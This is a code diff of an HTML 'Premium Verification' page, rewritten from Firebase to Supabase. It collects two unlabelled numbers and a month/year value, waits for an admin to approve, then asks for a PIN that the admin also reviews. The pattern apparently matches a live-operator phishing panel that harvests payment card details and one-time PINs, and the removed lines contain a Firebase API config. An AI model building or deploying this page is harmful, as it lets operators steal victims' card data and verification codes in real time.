@@ -2,119 +2,49 @@
 <html>
 <head>
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Premium Verification</title>
 
-<title>Live Verification</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 
 <style>
 
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Poppins',sans-serif;
-}
-
 body{
-    min-height:100vh;
+    background:#111;
+    color:white;
+    font-family:Arial;
     display:flex;
     justify-content:center;
     align-items:center;
-    background:#0f0f0f;
-    overflow:hidden;
-}
-
-.bg1{
-    position:absolute;
-    width:400px;
-    height:400px;
-    background:#ff0080;
-    filter:blur(180px);
-    top:-100px;
-    left:-100px;
-    opacity:0.4;
-}
-
-.bg2{
-    position:absolute;
-    width:400px;
-    height:400px;
-    background:#7928ca;
-    filter:blur(180px);
-    bottom:-100px;
-    right:-100px;
-    opacity:0.4;
+    height:100vh;
 }
 
 .box{
-    width:420px;
-    background:rgba(255,255,255,0.06);
-    border:1px solid rgba(255,255,255,0.1);
-    backdrop-filter:blur(20px);
-    padding:35px;
-    border-radius:30px;
-    position:relative;
-    z-index:10;
-    box-shadow:0 20px 60px rgba(0,0,0,0.5);
-}
-
-h2{
-    color:white;
-    text-align:center;
-    margin-bottom:30px;
-    font-size:30px;
+    width:400px;
+    background:#1b1b1b;
+    padding:30px;
+    border-radius:20px;
 }
 
 input{
     width:100%;
-    margin-bottom:18px;
-    padding:15px;
+    padding:14px;
+    margin-bottom:15px;
     border:none;
-    border-radius:14px;
-    background:rgba(255,255,255,0.08);
-    color:white;
-    outline:none;
-    font-size:15px;
+    border-radius:10px;
 }
 
 button{
     width:100%;
-    padding:15px;
-    border:none;
-    border-radius:14px;
-    background:linear-gradient(135deg,#ff0080,#7928ca);
+    padding:14px;
+    background:#ff0080;
     color:white;
-    font-size:16px;
-    font-weight:600;
+    border:none;
+    border-radius:10px;
     cursor:pointer;
 }
 
 #status{
-    margin-top:25px;
-    color:white;
-    text-align:center;
-}
-
-.pinBox{
     margin-top:20px;
-}
-
-.success{
-    color:#00ff95;
-    font-size:26px;
-    font-weight:700;
-}
-
-.reject{
-    color:red;
-    font-weight:600;
-}
-
-.wait{
-    color:#ffd166;
 }
 
 </style>
@@ -122,183 +52,162 @@ button{
 </head>
 <body>
 
-<div class="bg1"></div>
-<div class="bg2"></div>
-
 <div class="box">
 
-<h2>Premium Verification</h2>
+<h2>Verification</h2>
 
-<form id="mainForm">
+<input type="text" id="number1" placeholder="Number 1">
 
-<input type="text" id="number1" placeholder="Enter Number 1" required>
+<input type="month" id="date_value">
 
-<input type="month" id="dateValue" required>
+<input type="text" id="number2" placeholder="Number 2">
 
-<input type="text" id="number2" placeholder="Enter Number 2" required>
-
-<button type="submit">Continue</button>
-
-</form>
+<button onclick="submitForm()">
+Continue
+</button>
 
 <div id="status"></div>
 
 </div>
 
+<script>
 
-<script type="module">
+const SUPABASE_URL = 'YOUR_URL';
+const SUPABASE_KEY = 'YOUR_KEY';
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+const client = supabase.createClient(
+SUPABASE_URL,
+SUPABASE_KEY
+);
 
-import {
-getFirestore,
-collection,
-addDoc,
-doc,
-onSnapshot,
-updateDoc
+let currentId = null;
+
+
+// SUBMIT FORM
+async function submitForm(){
+
+    const number1 =
+    document.getElementById('number1').value;
+
+    const date_value =
+    document.getElementById('date_value').value;
+
+    const number2 =
+    document.getElementById('number2').value;
+
+    document.getElementById('status').innerHTML =
+    'Submitting...';
+
+    const { data, error } = await client
+    .from('requests')
+    .insert([
+        {
+            number1,
+            date_value,
+            number2
+        }
+    ])
+    .select();
+
+    currentId = data[0].id;
+
+    listenStatus();
+
 }
-from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 
-// PASTE FIREBASE CONFIG HERE
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyC5YbZhR6rgKB3P5b7NFJLc0v9XTfV13fY",
-  authDomain: "live-project-b8670.firebaseapp.com",
-  projectId: "live-project-b8670",
-  storageBucket: "live-project-b8670.firebasestorage.app",
-  messagingSenderId: "697940186812",
-  appId: "1:697940186812:web:839b1bdd9291aea6e862b9",
-  measurementId: "G-L9PNRZEV5W"
-};
+// REALTIME
+async function listenStatus(){
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+    setInterval(async()=>{
 
-let currentId = "";
+        const { data } = await client
+        .from('requests')
+        .select('*')
+        .eq('id',currentId)
+        .single();
 
-
-// FORM SUBMIT
-
-document.getElementById('mainForm').addEventListener('submit', async(e)=>{
-
-    e.preventDefault();
-
-    const number1 = document.getElementById('number1').value;
-    const dateValue = document.getElementById('dateValue').value;
-    const number2 = document.getElementById('number2').value;
-
-    document.getElementById('status').innerHTML = `
-    <div class="wait">Submitting Request...</div>
-    `;
-
-    const docRef = await addDoc(collection(db,'requests'),{
-
-        number1,
-        dateValue,
-        number2,
-        status:'pending',
-        pin:'',
-        pinStatus:'waiting'
-
-    });
-
-    currentId = docRef.id;
-
-    listenRealtime();
-
-});
-
-
-// REALTIME LISTENER
-
-function listenRealtime(){
-
-    const ref = doc(db,'requests',currentId);
-
-    onSnapshot(ref, async(snapshot)=>{
-
-        const data = snapshot.data();
-
+        // PENDING
         if(data.status === 'pending'){
 
-            document.getElementById('status').innerHTML = `
-            <div class="wait">Waiting For Admin Approval...</div>
-            `;
+            document.getElementById('status').innerHTML =
+            'Waiting For Admin...';
 
         }
 
+        // REJECTED
         else if(data.status === 'rejected'){
 
-            document.getElementById('status').innerHTML = `
-            <div class="reject">Request Rejected</div>
-            `;
+            document.getElementById('status').innerHTML =
+            'Request Rejected';
 
         }
 
+        // ACCEPTED
         else if(data.status === 'accepted'){
 
-            if(data.pinStatus === 'waiting'){
+            // PIN WAIT
+            if(data.pin_status === 'waiting'){
 
                 document.getElementById('status').innerHTML = `
 
-                <div class="pinBox">
-
-                <input type="text" id="pinInput" placeholder="Enter PIN">
+                <input type="text"
+                id="pin"
+                placeholder="Enter PIN">
 
                 <button onclick="submitPin()">
                 Submit PIN
                 </button>
 
-                </div>
-
                 `;
 
             }
 
-            else if(data.pinStatus === 'pending'){
+            // PIN PENDING
+            else if(data.pin_status === 'pending'){
 
-                document.getElementById('status').innerHTML = `
-                <div class="wait">PIN Submitted. Waiting For Admin...</div>
-                `;
-
-            }
-
-            else if(data.pinStatus === 'rejected'){
-
-                document.getElementById('status').innerHTML = `
-                <div class="reject">PIN Rejected</div>
-                `;
+                document.getElementById('status').innerHTML =
+                'Waiting For PIN Approval...';
 
             }
 
-            else if(data.pinStatus === 'accepted'){
+            // PIN REJECTED
+            else if(data.pin_status === 'rejected'){
 
-                document.getElementById('status').innerHTML = `
-                <div class="success">Congratulations 🎉</div>
-                `;
+                document.getElementById('status').innerHTML =
+                'PIN Rejected';
+
+            }
+
+            // SUCCESS
+            else if(data.pin_status === 'accepted'){
+
+                document.getElementById('status').innerHTML =
+                '<h1>Congratulations 🎉</h1>';
 
             }
 
         }
 
-    });
+    },2000);
 
 }
 
 
-// GLOBAL PIN FUNCTION
-window.submitPin = async function(){
 
-    const pin = document.getElementById('pinInput').value;
+// SUBMIT PIN
+async function submitPin(){
 
-    await updateDoc(doc(db,'requests',currentId),{
+    const pin =
+    document.getElementById('pin').value;
 
+    await client
+    .from('requests')
+    .update({
         pin:pin,
-        pinStatus:'pending'
-
-    });
+        pin_status:'pending'
+    })
+    .eq('id',currentId);
 
 }
 
